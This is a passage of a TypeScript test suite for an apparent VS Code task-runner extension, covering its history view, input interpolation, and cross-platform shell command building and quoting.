				askName: { value: 'release' }
			});
			// Other fields untouched.
			assert.strictEqual(entry.actionId, 'with-inputs');
			assert.strictEqual(entry.status, 'success');
		});

		test('setHistoryInputs with an empty object clears the field rather than persisting noise', () => {
			const provider = new HistoryProvider(createMockContext());
			const ts = 10;
			provider.addHistoryEntry(makeEntry('empty', 'success', ts));
			// First seed inputs so we can prove the second call clears them.
			provider.setHistoryInputs('empty', ts, { pick: { value: 'a' } });
			assert.ok(provider.getHistory()[0].inputs);
			provider.setHistoryInputs('empty', ts, {});
			assert.strictEqual(provider.getHistory()[0].inputs, undefined);
		});

		test('setHistoryInputs on an unknown (actionId, timestamp) is a silent no-op', () => {
			const provider = new HistoryProvider(createMockContext());
			provider.addHistoryEntry(makeEntry('only', 'success', 1));
			provider.setHistoryInputs('missing', 999, { pick: { value: 'x' } });
			const history = provider.getHistory();
			assert.strictEqual(history.length, 1);
			assert.strictEqual(history[0].inputs, undefined);
		});

		test('inputs field round-trips through workspaceState across HistoryProvider instances', () => {
			const ctx = createMockContext();
			const p1 = new HistoryProvider(ctx);
			const ts = 42;
			p1.addHistoryEntry(makeEntry('persist-inputs', 'success', ts));
			p1.setHistoryInputs('persist-inputs', ts, {
				file: { path: '/abs/x.bin', name: 'x.bin' },
				flag: { value: '--release' }
			});
			const p2 = new HistoryProvider(ctx);
			const entry = p2.getHistory()[0];
			assert.deepStrictEqual(entry.inputs, {
				file: { path: '/abs/x.bin', name: 'x.bin' },
				flag: { value: '--release' }
			});
		});

		test('input task type signatures round-trip and __proto__ remains an own key', () => {
			const ctx = createMockContext();
			const provider = new HistoryProvider(ctx);
			provider.addHistoryEntry(makeEntry('typed-inputs', 'success', 43));
			provider.setHistoryInputs(
				'typed-inputs',
				43,
				JSON.parse('{"__proto__":{"value":"kept"}}'),
				JSON.parse('{"__proto__":"inputBox"}')
			);

			const entry = new HistoryProvider(ctx).getHistory()[0];
			assert.ok(Object.prototype.hasOwnProperty.call(entry.inputs, '__proto__'));
			assert.ok(Object.prototype.hasOwnProperty.call(entry.inputTaskTypes, '__proto__'));
			assert.deepStrictEqual(entry.inputs?.__proto__, { value: 'kept' });
			assert.strictEqual(entry.inputTaskTypes?.__proto__, 'inputBox');
		});

		test('HistoryItem contextValue distinguishes inputs / output / both / neither', async () => {
			const provider = new HistoryProvider(createMockContext());
			provider.addHistoryEntry(makeEntry('plain', 'success', 1));
			provider.addHistoryEntry(makeEntry('out-only', 'failure', 2, 'boom'));
			provider.addHistoryEntry(makeEntry('in-only', 'success', 3));
			provider.setHistoryInputs('in-only', 3, { pick: { value: 'p' } });
			provider.addHistoryEntry(makeEntry('both', 'failure', 4, 'broke'));
			provider.setHistoryInputs('both', 4, { pick: { value: 'p' } });

			const items = await provider.getChildren();
			// Newest-first ordering: both / in-only / out-only / plain.
			const byActionId = new Map(items.map(i => [i.getEntry().actionId, i]));
			assert.strictEqual(byActionId.get('plain')?.contextValue, 'historyItem');
			assert.strictEqual(byActionId.get('out-only')?.contextValue, 'historyItem.output');
			assert.strictEqual(byActionId.get('in-only')?.contextValue, 'historyItem.inputs');
			assert.strictEqual(byActionId.get('both')?.contextValue, 'historyItem.inputs.output');
		});

		test('setHistoryCommands adds the .commands flag to contextValue and clears it when empty', async () => {
			const provider = new HistoryProvider(createMockContext());
			provider.addHistoryEntry(makeEntry('cmd', 'success', 1));
			provider.setHistoryCommands('cmd', 1, { build: 'gcc -o app main.c' });

			let items = await provider.getChildren();
			assert.strictEqual(items[0].contextValue, 'historyItem.commands');
			assert.deepStrictEqual(items[0].getEntry().commands, { build: 'gcc -o app main.c' });

			// Empty map clears the field so the affordance disappears.
			provider.setHistoryCommands('cmd', 1, {});
			items = await provider.getChildren();
			assert.strictEqual(items[0].contextValue, 'historyItem');
			assert.strictEqual(items[0].getEntry().commands, undefined);
		});

		test('inputs + output + commands compose into a single dotted contextValue', async () => {
			const provider = new HistoryProvider(createMockContext());
			provider.addHistoryEntry(makeEntry('all', 'success', 1, 'log output'));
			provider.setHistoryInputs('all', 1, { pick: { value: 'p' } });
			provider.setHistoryCommands('all', 1, { run: 'echo hi' });

			const items = await provider.getChildren();
			assert.strictEqual(items[0].contextValue, 'historyItem.inputs.output.commands');
		});

		test('contextValue: inputs+commands (no output) and output+commands (no inputs) compose correctly', async () => {
			const provider = new HistoryProvider(createMockContext());
			provider.addHistoryEntry(makeEntry('in-cmd', 'success', 1));
			provider.setHistoryInputs('in-cmd', 1, { pick: { value: 'p' } });
			provider.setHistoryCommands('in-cmd', 1, { run: 'echo a' });

			provider.addHistoryEntry(makeEntry('out-cmd', 'failure', 2, 'boom'));
			provider.setHistoryCommands('out-cmd', 2, { run: 'echo b' });

			const byId = new Map((await provider.getChildren()).map(i => [i.getEntry().actionId, i]));
			assert.strictEqual(byId.get('in-cmd')?.contextValue, 'historyItem.inputs.commands');
			assert.strictEqual(byId.get('out-cmd')?.contextValue, 'historyItem.output.commands');
		});

		test('setHistoryCommands on an unknown (actionId, timestamp) is a silent no-op', () => {
			const provider = new HistoryProvider(createMockContext());
			provider.addHistoryEntry(makeEntry('present', 'success', 1));
			// Neither a wrong id nor a wrong timestamp should mutate anything.
			provider.setHistoryCommands('absent', 1, { run: 'echo x' });
			provider.setHistoryCommands('present', 999, { run: 'echo x' });
			const history = provider.getHistory();
			assert.strictEqual(history.length, 1);
			assert.strictEqual(history[0].commands, undefined);
		});

		test('setHistoryRunLog stores only the workspace-relative report reference', async () => {
			const ctx = createMockContext();
			const provider = new HistoryProvider(ctx);
			provider.addHistoryEntry(makeEntry('reported', 'success', 77));
			provider.setHistoryRunLog('reported', 77, {
				workspaceFolderUri: 'file:///workspace',
				relativePath: '.taskhub/logs/reported-deadbeef/run.log'
			});

			const entry = provider.getHistory()[0];
			assert.deepStrictEqual(entry.runLog, {
				workspaceFolderUri: 'file:///workspace',
				relativePath: '.taskhub/logs/reported-deadbeef/run.log'
			});
			// 보고서 버튼은 `.runlog` 로만 붙는다 — 참조가 붙기 전에는 버튼이
			// 없어야 "눌러도 안내만 뜨는" 죽은 버튼이 생기지 않는다.
			assert.strictEqual((await provider.getChildren())[0].contextValue, 'historyItem.runlog');
		});

		test('보고서 참조가 없는 기록에는 .runlog 플래그가 붙지 않는다', async () => {
			const provider = new HistoryProvider(createMockContext());
			provider.addHistoryEntry(makeEntry('no-report', 'success', 5));
			assert.strictEqual((await provider.getChildren())[0].contextValue, 'historyItem');
		});

		/**
		 * 인라인 아이콘과 우클릭 메뉴는 **일부러 다른 조건**이다 (0.7.31).
		 *
		 * 아이콘은 데이터가 있는 행에만 붙어 목록이 정직해지고, 메뉴는 액션 기록이면
		 * 항상 붙어 "로그가 없다" 는 사실과 켜는 방법을 안내한다 — 메뉴까지 가리면
		 * 기능이 있다는 것 자체를 알 수 없어, 사용자가 History 를 지우고 설정을 뒤진
		 * 끝에 고장으로 결론 내린 것이 이 조건을 바꾼 이유다. 조건이 조용히 되돌아가면
		 * 그 신고가 그대로 되살아나므로 manifest 를 여기서 고정한다.
		 */
		test('보고서 메뉴: 인라인은 .runlog, 우클릭은 모든 액션 기록', () => {
			const manifest = JSON.parse(
				fs.readFileSync(path.join(path.resolve(__dirname, '..', '..'), 'package.json'), 'utf-8'));
			const entries = manifest.contributes.menus['view/item/context']
				.filter((m: any) => m.command === 'taskhub.viewActionRunReport');
			assert.strictEqual(entries.length, 2, '보고서 메뉴 항목이 인라인·우클릭 두 벌이 아니다');

			const inline = entries.find((m: any) => String(m.group).startsWith('inline'));
			const context = entries.find((m: any) => String(m.group).startsWith('context'));
			assert.ok(inline, '인라인 보고서 메뉴 항목이 없다');
			assert.ok(context, '우클릭 메뉴 항목이 없다');

			// `when` 을 문자열로만 보지 않고 실제 contextValue 로 판정한다.
			const match = (when: string, contextValue: string) => {
				const m = /viewItem =~ \/(.+)\//.exec(when);
				assert.ok(m, `viewItem 정규식을 읽지 못했다: ${when}`);
				return new RegExp(m![1]).test(contextValue);
			};
			assert.ok(match(inline.when, 'historyItem.runlog'), '로그가 있는 행에서 인라인 아이콘이 숨는다');
			assert.ok(match(context.when, 'historyItem'), '로그 없는 액션 기록에서 메뉴가 숨는다 — 발견 경로가 사라진다');
			assert.ok(match(context.when, 'historyItem.inputs.runlog'));
			assert.ok(!match(context.when, 'historyToolItem'), '도구 열람 기록에 액션 보고서 메뉴가 붙었다');
			assert.ok(!match(inline.when, 'historyItem'), '로그 없는 행에 죽은 아이콘이 붙었다');
		});

		test('setHistoryRunLog on an unknown execution is a silent no-op', () => {
			const provider = new HistoryProvider(createMockContext());
			provider.addHistoryEntry(makeEntry('present', 'success', 1));
			provider.setHistoryRunLog('missing', 1, {
				workspaceFolderUri: 'file:///workspace',
				relativePath: '.taskhub/logs/missing-deadbeef/run.log'
			});
			assert.strictEqual(provider.getHistory()[0].runLog, undefined);
		});

		test('setHistoryCommands targets the entry matched by (actionId, timestamp), not just actionId', () => {
			const provider = new HistoryProvider(createMockContext());
			provider.addHistoryEntry(makeEntry('rerun', 'success', 100));
			provider.addHistoryEntry(makeEntry('rerun', 'success', 200));
			provider.setHistoryCommands('rerun', 100, { run: 'old' });

			const history = provider.getHistory();
			const older = history.find(e => e.timestamp === 100);
			const newer = history.find(e => e.timestamp === 200);
			assert.deepStrictEqual(older?.commands, { run: 'old' });
			assert.strictEqual(newer?.commands, undefined);
		});

		test('setHistoryCommands overwrites previously recorded commands', () => {
			const provider = new HistoryProvider(createMockContext());
			provider.addHistoryEntry(makeEntry('over', 'success', 1));
			provider.setHistoryCommands('over', 1, { a: 'first' });
			provider.setHistoryCommands('over', 1, { b: 'second' });
			assert.deepStrictEqual(provider.getHistory()[0].commands, { b: 'second' });
		});

		test('commands field round-trips through workspaceState across HistoryProvider instances', () => {
			const ctx = createMockContext();
			const p1 = new HistoryProvider(ctx);
			const ts = 77;
			p1.addHistoryEntry(makeEntry('persist-commands', 'success', ts));
			p1.setHistoryCommands('persist-commands', ts, {
				build: 'gcc -O2 -o app main.c',
				run: 'app --verbose'
			});
			const p2 = new HistoryProvider(ctx);
			assert.deepStrictEqual(p2.getHistory()[0].commands, {
				build: 'gcc -O2 -o app main.c',
				run: 'app --verbose'
			});
		});

		suite('formatExecutedCommandsDocument', () => {
			function entryWithCommands(commands?: Record<string, string>): HistoryEntry {
				const e = makeEntry('fmt', 'success', 1700000000000);
				if (commands) { e.commands = commands; }
				return e;
			}

			test('returns null when the entry has no commands field', () => {
				assert.strictEqual(formatExecutedCommandsDocument(entryWithCommands()), null);
			});

			test('returns null when commands is an empty object', () => {
				assert.strictEqual(formatExecutedCommandsDocument(entryWithCommands({})), null);
			});

			test('single command: header carries the action title and the [taskId] section holds the command', () => {
				const content = formatExecutedCommandsDocument(entryWithCommands({ build: 'gcc -o app main.c' }))!;
				assert.ok(content !== null);
				// Header is locale-dependent (t(ko, en)); the action title is in
				// both variants, so assert on that rather than the keyword.
				assert.ok(content.includes('Title for fmt'), `header should contain the action title, got:\n${content}`);
				assert.ok(content.includes('[build]\ngcc -o app main.c'), `body should hold the [taskId] section, got:\n${content}`);
			});

			test('multiple commands: one section per task, in insertion order, blank-line separated', () => {
				const content = formatExecutedCommandsDocument(entryWithCommands({
					build: 'gcc -o app main.c',
					deploy: 'scp app server:/opt'
				}))!;
				assert.ok(content.includes('[build]\ngcc -o app main.c'));
				assert.ok(content.includes('[deploy]\nscp app server:/opt'));
				assert.ok(
					content.indexOf('[build]') < content.indexOf('[deploy]'),
					'sections must preserve insertion order'
				);
				assert.ok(
					content.includes('main.c\n\n[deploy]'),
					'sections must be separated by a blank line'
				);
			});
		});

		test('rerun flow: re-adding with a new timestamp yields two distinct entries', () => {
			const provider = new HistoryProvider(createMockContext());
			provider.addHistoryEntry(makeEntry('rerun', 'success', 100));
			provider.addHistoryEntry(makeEntry('rerun', 'success', 200));
			const history = provider.getHistory();
			assert.strictEqual(history.length, 2);
			assert.strictEqual(history[0].timestamp, 200);
			assert.strictEqual(history[1].timestamp, 100);
		});

		test('deleteHistoryItem removes only the matching (actionId, timestamp) entry', () => {
			const provider = new HistoryProvider(createMockContext());
			provider.addHistoryEntry(makeEntry('a', 'success', 1));
			provider.addHistoryEntry(makeEntry('a', 'success', 2));
			provider.addHistoryEntry(makeEntry('b', 'success', 3));
			provider.deleteHistoryItem(makeEntry('a', 'success', 1));
			const history = provider.getHistory();
			assert.deepStrictEqual(
				history.map(e => `${e.actionId}:${e.timestamp}`).sort(),
				['a:2', 'b:3']
			);
		});

		test('deleteHistoryItem with no matching entry leaves history untouched', () => {
			const provider = new HistoryProvider(createMockContext());
			provider.addHistoryEntry(makeEntry('a', 'success', 1));
			provider.deleteHistoryItem(makeEntry('a', 'success', 999));
			assert.strictEqual(provider.getHistory().length, 1);
		});

		test('clearAllHistory empties the persisted store', () => {
			const ctx = createMockContext();
			const provider = new HistoryProvider(ctx);
			provider.addHistoryEntry(makeEntry('a'));
			provider.addHistoryEntry(makeEntry('b'));
			provider.clearAllHistory();
			assert.deepStrictEqual(provider.getHistory(), []);
			// A second provider on the same context must see the cleared state too.
			assert.deepStrictEqual(new HistoryProvider(ctx).getHistory(), []);
		});

		test('trimHistoryToMax shrinks over-length history to the current maxItems setting', async () => {
			const ctx = createMockContext();
			const seedProvider = createHistoryProvider(50, ctx);
			for (let i = 0; i < 8; i++) {
				seedProvider.addHistoryEntry(makeEntry(`x${i}`, 'success', 1000 + i));
			}
			// Lower maxItems, then trim. We expect only the first 4 newest
			// entries to remain (history is ordered newest-first).
			const trimProvider = createHistoryProvider(4, ctx);
			trimProvider.trimHistoryToMax();
			const history = trimProvider.getHistory();
			assert.strictEqual(history.length, 4);
			assert.deepStrictEqual(
				history.map(e => e.actionId),
				['x7', 'x6', 'x5', 'x4']
			);
		});

		test('trimHistoryToMax is a no-op when history.length <= maxItems', async () => {
			const ctx = createMockContext();
			const provider = createHistoryProvider(10, ctx);
			provider.addHistoryEntry(makeEntry('a', 'success', 1));
			provider.addHistoryEntry(makeEntry('b', 'success', 2));
			provider.trimHistoryToMax();
			assert.strictEqual(provider.getHistory().length, 2);
		});

		test('createToolHistoryEntry stores Memory Map metadata in the shared history shape', () => {
			const entry = createToolHistoryEntry({
				kind: 'memoryMap',
				filePath: '/workspace/build/app.axf',
				timestamp: 1234,
				memoryMapInputType: 'elf',
				memoryMapConfig: {
					regions: [{ name: 'FLASH', origin: 0x08000000, size: 1024 }]
				}
			});
			assert.strictEqual(entry.entryType, 'tool');
			assert.strictEqual(entry.actionTitle, 'Memory Map: app.axf');
			assert.strictEqual(entry.status, 'success');
			assert.ok(isToolHistoryEntry(entry));
			assert.strictEqual(entry.tool.filePath, '/workspace/build/app.axf');
			assert.strictEqual(entry.tool.memoryMapInputType, 'elf');
			assert.deepStrictEqual(entry.tool.memoryMapConfig?.regions, [
				{ name: 'FLASH', origin: 0x08000000, size: 1024 }
			]);
		});

		test('tool history rows open the tool instead of rerunning an action', async () => {
			const provider = new HistoryProvider(createMockContext());
			provider.addHistoryEntry(createToolHistoryEntry({
				kind: 'hexEditor',
				filePath: '/workspace/image.hex',
				timestamp: 55
			}));

			const items = await provider.getChildren();
			assert.strictEqual(items.length, 1);
			const item = items[0];
			assert.strictEqual(item.label, 'Hex Editor: image.hex');
			assert.strictEqual(item.contextValue, 'historyToolItem');
			assert.strictEqual(item.command?.command, 'taskhub.openToolFromHistory');
			assert.ok(isToolHistoryEntry(item.getEntry()));
		});

		test('createToolHistoryEntry builds a JSON Editor tool entry that opens via openToolFromHistory', async () => {
			const provider = new HistoryProvider(createMockContext());
			const entry = createToolHistoryEntry({
				kind: 'jsonEditor',
				filePath: '/workspace/config/settings.json',
				timestamp: 99
			});
			assert.strictEqual(entry.entryType, 'tool');
			assert.strictEqual(entry.actionTitle, 'JSON Editor: settings.json');
			assert.strictEqual(entry.status, 'success');
			assert.ok(isToolHistoryEntry(entry));
			assert.strictEqual(entry.tool.kind, 'jsonEditor');
			assert.strictEqual(entry.tool.filePath, '/workspace/config/settings.json');
			assert.strictEqual(entry.tool.memoryMapInputType, undefined);

			provider.addHistoryEntry(entry);
			const items = await provider.getChildren();
			assert.strictEqual(items.length, 1);
			assert.strictEqual(items[0].label, 'JSON Editor: settings.json');
			assert.strictEqual(items[0].command?.command, 'taskhub.openToolFromHistory');
		});

		test('getChildren returns one HistoryItem per entry, carrying the rerun command', async () => {
			const provider = new HistoryProvider(createMockContext());
			provider.addHistoryEntry(makeEntry('run-me', 'success', 1));
			const items = await provider.getChildren();
			assert.strictEqual(items.length, 1);
			const item = items[0];
			// TreeItem label comes from actionTitle in the entry.
			assert.strictEqual(item.label, 'Title for run-me');
			assert.strictEqual(item.command?.command, 'taskhub.rerunFromHistory');
			assert.strictEqual(item.getEntry().actionId, 'run-me');
		});
	});

	suite('InputBox Task', () => {
		test('should apply prefix to user input', () => {
			const userInput = 'Test 1234 123';
			const prefix = '-g ';
			const expected = '-g Test 1234 123';
			const result = prefix + userInput;
			assert.strictEqual(result, expected);
		});

		test('should apply suffix to user input', () => {
			const userInput = 'Test 1234 123';
			const suffix = ' --verbose';
			const expected = 'Test 1234 123 --verbose';
			const result = userInput + suffix;
			assert.strictEqual(result, expected);
		});

		test('should apply both prefix and suffix', () => {
			const userInput = 'Test 1234 123';
			const prefix = '-g ';
			const suffix = ' --verbose';
			const expected = '-g Test 1234 123 --verbose';
			const result = prefix + userInput + suffix;
			assert.strictEqual(result, expected);
		});

		test('should return user input when no prefix/suffix', () => {
			const userInput = 'Test 1234 123';
			const result = userInput;
			assert.strictEqual(result, userInput);
		});

		test('should handle empty user input with prefix/suffix', () => {
			const userInput = '';
			const prefix = '-g ';
			const suffix = ' --verbose';
			const expected = '-g  --verbose';
			const result = prefix + userInput + suffix;
			assert.strictEqual(result, expected);
		});

		test('should interpolate prefix in template', () => {
			const prefix = '-g ';
			const userInput = 'Test';
			const template = '${input.value}';
			const context = { input: { value: prefix + userInput } };
			const result = interpolatePipelineVariables(template, context);
			assert.strictEqual(result, '-g Test');
		});
	});

	suite('QuickPick Task', () => {
		test('should handle single selection', () => {
			const items = ['dev', 'staging', 'production'];
			const selected = 'staging';
			assert.ok(items.includes(selected));
		});

		test('should handle multiple selection', () => {
			const items = ['feature1', 'feature2', 'feature3'];
			const selected = ['feature1', 'feature3'];
			selected.forEach(item => {
				assert.ok(items.includes(item));
			});
		});

		test('should handle quick pick item with description', () => {
			const item = {
				label: 'production',
				description: 'Production environment',
				detail: 'Use this for production deployment'
			};
			assert.strictEqual(item.label, 'production');
			assert.strictEqual(item.description, 'Production environment');
		});

		test('should interpolate selected value in template', () => {
			const template = 'Running in ${env.value} environment';
			const context = { env: { value: 'production' } };
			const result = interpolatePipelineVariables(template, context);
			assert.strictEqual(result, 'Running in production environment');
		});

		test('should handle multiple selections in template', () => {
			const template = 'Selected: ${features.values}';
			const context = { features: { values: 'feature1,feature2' } };
			const result = interpolatePipelineVariables(template, context);
			assert.strictEqual(result, 'Selected: feature1,feature2');
		});
	});

	suite('getCommandString', () => {
		test('should return string command as-is', () => {
			const command = 'echo Hello';
			const result = getCommandString(command);
			assert.strictEqual(result, 'echo Hello');
		});

		test('should select windows command on win32 platform', () => {
			const originalPlatform = process.platform;
			try {
				Object.defineProperty(process, 'platform', { value: 'win32' });
				const command = {
					windows: 'dir',
					macos: 'ls',
					linux: 'ls'
				};
				const result = getCommandString(command);
				assert.strictEqual(result, 'dir');
			} finally {
				Object.defineProperty(process, 'platform', { value: originalPlatform });
			}
		});

		test('should select macos command on darwin platform', () => {
			const originalPlatform = process.platform;
			try {
				Object.defineProperty(process, 'platform', { value: 'darwin' });
				const command = {
					windows: 'dir',
					macos: 'ls -la',
					linux: 'ls'
				};
				const result = getCommandString(command);
				assert.strictEqual(result, 'ls -la');
			} finally {
				Object.defineProperty(process, 'platform', { value: originalPlatform });
			}
		});

		test('should select linux command on linux platform', () => {
			const originalPlatform = process.platform;
			try {
				Object.defineProperty(process, 'platform', { value: 'linux' });
				const command = {
					windows: 'dir',
					macos: 'ls',
					linux: 'ls -al'
				};
				const result = getCommandString(command);
				assert.strictEqual(result, 'ls -al');
			} finally {
				Object.defineProperty(process, 'platform', { value: originalPlatform });
			}
		});

		test('should throw error for unsupported platform', () => {
			const originalPlatform = process.platform;
			try {
				Object.defineProperty(process, 'platform', { value: 'darwin' });
				const command = {
					windows: 'dir',
					linux: 'ls'
				};
				assert.throws(() => getCommandString(command), /Invalid or unsupported 'command'/);
			} finally {
				Object.defineProperty(process, 'platform', { value: originalPlatform });
			}
		});

		test('should throw error for invalid command type', () => {
			assert.throws(() => getCommandString(null), /Invalid or unsupported 'command'/);
			assert.throws(() => getCommandString(123), /Invalid or unsupported 'command'/);
		});
	});

	suite('getToolCommand', () => {
		test('should return string tool path as-is', () => {
			const tool = '/usr/bin/7z';
			const result = getToolCommand(tool);
			assert.strictEqual(result, '/usr/bin/7z');
		});

		test('should quote tool path with spaces', () => {
			const tool = 'C:\\Program Files\\7-Zip\\7z.exe';
			const result = getToolCommand(tool);
			assert.strictEqual(result, '"C:\\Program Files\\7-Zip\\7z.exe"');
		});

		test('should not double-quote already quoted path', () => {
			const tool = '"C:\\Program Files\\7-Zip\\7z.exe"';
			const result = getToolCommand(tool);
			assert.strictEqual(result, '"C:\\Program Files\\7-Zip\\7z.exe"');
		});

		test('should select platform-specific tool path', () => {
			const originalPlatform = process.platform;
			try {
				Object.defineProperty(process, 'platform', { value: 'darwin' });
				const tool = {
					windows: 'C:\\Program Files\\7-Zip\\7z.exe',
					macos: '/opt/homebrew/bin/7z',
					linux: '/usr/bin/7z'
				};
				const result = getToolCommand(tool);
				assert.strictEqual(result, '/opt/homebrew/bin/7z');
			} finally {
				Object.defineProperty(process, 'platform', { value: originalPlatform });
			}
		});

		test('should throw error when platform-specific tool not found', () => {
			const originalPlatform = process.platform;
			try {
				Object.defineProperty(process, 'platform', { value: 'darwin' });
				const tool = {
					windows: 'C:\\Program Files\\7-Zip\\7z.exe',
					linux: '/usr/bin/7z'
				};
				assert.throws(() => getToolCommand(tool), /No tool path specified for the current platform/);
			} finally {
				Object.defineProperty(process, 'platform', { value: originalPlatform });
			}
		});
	});

	suite('buildPowerShellInvocation', () => {
		test('should build basic PowerShell invocation', () => {
			const result = buildPowerShellInvocation('echo', ['Hello'], false);
			assert.strictEqual(result.display, "& 'echo' 'Hello'");
			assert.ok(result.script.includes("& 'echo' 'Hello'"));
		});

		test('should escape single quotes in arguments', () => {
			const result = buildPowerShellInvocation('echo', ["It's working"], false);
			assert.strictEqual(result.display, "& 'echo' 'It''s working'");
		});

		test('should handle UTF-8 console enforcement', () => {
			const result = buildPowerShellInvocation('python', ['script.py'], true);
			assert.ok(result.script.includes('[Console]::OutputEncoding'));
			assert.ok(result.script.includes('UTF8'));
		});

		test('should handle command with existing args', () => {
			const result = buildPowerShellInvocation('git status', ['-v'], false);
			assert.strictEqual(result.display, "& 'git' 'status' '-v'");
		});

		test('should handle empty args array', () => {
			const result = buildPowerShellInvocation('pwd', [], false);
			assert.strictEqual(result.display, "& 'pwd'");
		});
	});

	suite('buildPosixCommandLine', () => {
		test('should build basic POSIX command line', () => {
			const result = buildPosixCommandLine('echo', ['Hello']);
			assert.strictEqual(result, "echo 'Hello'");
		});

		test('should escape single quotes in arguments', () => {
			const result = buildPosixCommandLine('echo', ["It's working"]);
			assert.strictEqual(result, "echo 'It'\\''s working'");
		});

		test('should quote executable with special characters', () => {
			const result = buildPosixCommandLine('my@cmd', ['arg']);
			assert.strictEqual(result, "'my@cmd' 'arg'");
		});

		test('should not quote simple executable paths', () => {
			const result = buildPosixCommandLine('/usr/bin/echo', ['test']);
			assert.strictEqual(result, "/usr/bin/echo 'test'");
		});

		test('should handle command with existing args', () => {
			const result = buildPosixCommandLine('git status', ['-v']);
			assert.strictEqual(result, "git 'status' '-v'");
		});

		test('should handle multiple arguments', () => {
			const result = buildPosixCommandLine('node', ['script.js', '--port', '3000']);
			assert.strictEqual(result, "node 'script.js' '--port' '3000'");
		});
	});

	suite('encodePowerShellScript', () => {
		test('should encode PowerShell script to base64', () => {
			const script = 'Write-Host "Hello"';
			const result = encodePowerShellScript(script);
			assert.ok(typeof result === 'string');
			assert.ok(result.length > 0);
			// Decode and verify
			const decoded = Buffer.from(result, 'base64').toString('utf16le');
			assert.strictEqual(decoded, script);
		});

		test('should handle empty script', () => {
			const script = '';
			const result = encodePowerShellScript(script);
			assert.ok(typeof result === 'string');
		});

		test('should handle script with special characters', () => {
			const script = "Write-Host 'It''s working' -ForegroundColor Green";
			const result = encodePowerShellScript(script);
			const decoded = Buffer.from(result, 'base64').toString('utf16le');
			assert.strictEqual(decoded, script);
		});
	});

	suite('normalizeLineNumber', () => {
		test('should accept valid positive number', () => {
			assert.strictEqual(normalizeLineNumber(10), 10);
			assert.strictEqual(normalizeLineNumber(1), 1);
			assert.strictEqual(normalizeLineNumber(999), 999);
		});

		test('should floor decimal numbers', () => {
			assert.strictEqual(normalizeLineNumber(10.7), 10);
			assert.strictEqual(normalizeLineNumber(1.2), 1);
		});

		test('should reject zero and negative numbers', () => {
			assert.strictEqual(normalizeLineNumber(0), undefined);
			assert.strictEqual(normalizeLineNumber(-1), undefined);
			assert.strictEqual(normalizeLineNumber(-10), undefined);
		});

		test('should parse valid string numbers', () => {
			assert.strictEqual(normalizeLineNumber('10'), 10);
			assert.strictEqual(normalizeLineNumber('1'), 1);
			assert.strictEqual(normalizeLineNumber('999'), 999);
		});

		test('should reject invalid string inputs', () => {
			assert.strictEqual(normalizeLineNumber('abc'), undefined);
			assert.strictEqual(normalizeLineNumber('0'), undefined);
			assert.strictEqual(normalizeLineNumber('-5'), undefined);
			assert.strictEqual(normalizeLineNumber(''), undefined);
		});

		test('should reject non-finite numbers', () => {
			assert.strictEqual(normalizeLineNumber(Infinity), undefined);
			assert.strictEqual(normalizeLineNumber(-Infinity), undefined);
			assert.strictEqual(normalizeLineNumber(NaN), undefined);
		});

		test('should reject null and undefined', () => {
			assert.strictEqual(normalizeLineNumber(null), undefined);
			assert.strictEqual(normalizeLineNumber(undefined), undefined);
		});

		test('should reject other types', () => {
			assert.strictEqual(normalizeLineNumber({}), undefined);
			assert.strictEqual(normalizeLineNumber([]), undefined);
			assert.strictEqual(normalizeLineNumber(true), undefined);
		});
	});

	suite('wrapCommandForOneShot', () => {
		test('should wrap a directly-launchable Windows command with ProcessStartInfo and UTF-8', () => {
			const originalPlatform = process.platform;
			try {
				Object.defineProperty(process, 'platform', { value: 'win32' });
				const lookup = {
					env: { PATH: 'C:\\Windows\\System32' },
					isFile: (candidate: string) => candidate === 'C:\\Windows\\System32\\notepad.exe',
				};

				const result = wrapCommandForOneShot(
					'notepad.exe', ['file.txt'], undefined, true, lookup.env, false, lookup
				);

				assert.strictEqual(result.isPowerShellScript, true);
				assert.ok(result.commandLine.includes('System.Diagnostics.ProcessStartInfo'));
				assert.ok(result.commandLine.includes("$psi.FileName = 'C:\\Windows\\System32\\notepad.exe'"));
				assert.ok(result.commandLine.includes("$psi.Arguments = 'file.txt'"));
				assert.ok(result.commandLine.includes('[Console]::OutputEncoding'));
			} finally {
				Object.defineProperty(process, 'platform', { value: originalPlatform });
			}
		});

		test('should wrap a directly-launchable Windows command without UTF-8 and with cwd', () => {
			const originalPlatform = process.platform;
			try {
				Object.defineProperty(process, 'platform', { value: 'win32' });
				const lookup = {
					env: { PATH: 'C:\\Windows\\System32' },
					isFile: (candidate: string) => candidate === 'C:\\Windows\\System32\\notepad.exe',
				};

				const result = wrapCommandForOneShot(
					'notepad.exe', [], 'C:\\cwd', false, lookup.env, false, lookup
				);

				assert.strictEqual(result.isPowerShellScript, true);
				assert.ok(!result.commandLine.includes('[Console]::OutputEncoding'));
				assert.ok(result.commandLine.includes("$psi.WorkingDirectory = 'C:\\cwd'"));
			} finally {
				Object.defineProperty(process, 'platform', { value: originalPlatform });
			}
		});

		test('should preserve embedded double quotes for directly-launchable Windows one-shot args', () => {
			const originalPlatform = process.platform;
			try {
				Object.defineProperty(process, 'platform', { value: 'win32' });
				const lookup = {
					env: { PATH: 'C:\\node' },
					isFile: (candidate: string) => candidate === 'C:\\node\\node.exe',
				};

				const result = wrapCommandForOneShot(
					'node.exe', ['-e', 'process.stdout.write("ok")'], undefined, false,
					lookup.env, false, lookup
				);

				assert.ok(result.commandLine.includes('$psi.Arguments ='));
				assert.ok(result.commandLine.includes("$psi.FileName = 'C:\\node\\node.exe'"));
				assert.ok(result.commandLine.includes('process.stdout.write(\\"ok\\")'));
			} finally {
				Object.defineProperty(process, 'platform', { value: originalPlatform });
			}
		});

		test('should use Start-Process for a Windows shim/script one-shot command (PATHEXT/association resolution)', () => {
			const originalPlatform = process.platform;
			try {
				Object.defineProperty(process, 'platform', { value: 'win32' });

				const result = wrapCommandForOneShot('deploy.cmd', ['--prod'], 'C:\\cwd', false);

				assert.strictEqual(result.isPowerShellScript, true);
				assert.ok(!result.commandLine.includes('ProcessStartInfo'));
				assert.ok(result.commandLine.includes("Start-Process -FilePath 'deploy.cmd'"));
				assert.ok(result.commandLine.includes("-ArgumentList @('--prod')"));
				assert.ok(result.commandLine.includes("-WorkingDirectory 'C:\\cwd'"));
			} finally {
				Object.defineProperty(process, 'platform', { value: originalPlatform });
			}
		});

		test('should wrap command for POSIX with nohup', () => {
			const originalPlatform = process.platform;
			try {
				Object.defineProperty(process, 'platform', { value: 'linux' });

				const result = wrapCommandForOneShot('python', ['script.py'], undefined, false);

				assert.strictEqual(result.isPowerShellScript, false);
				assert.ok(result.commandLine.startsWith('nohup python'));
				assert.ok(result.commandLine.includes("'script.py'"));
				assert.ok(result.commandLine.endsWith('>/dev/null 2>&1 &'));
			} finally {
